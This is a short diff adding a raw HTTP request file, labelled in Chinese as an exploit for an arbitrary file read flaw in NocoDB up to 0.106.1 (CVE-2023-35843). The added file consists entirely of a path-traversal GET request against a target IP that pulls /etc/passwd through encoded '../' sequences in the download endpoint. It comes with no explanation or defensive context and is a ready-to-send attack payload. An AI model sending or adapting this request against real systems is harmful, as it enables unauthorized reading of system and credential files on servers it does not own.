@@ -1,0 +1,8 @@
+#[边界安全][HTTP仅发包][漏洞利用]NocoDB version <= 0.106.1 - 任意文件读取(CVE-2023-35843)
+GET /download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?_BAS_ID=691bcabb80cb5ffb HTTP/1.1
+accept: */*
+accept-encoding: gzip, deflate
+connection: keep-alive
+host: 10.10.121.19
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/
+
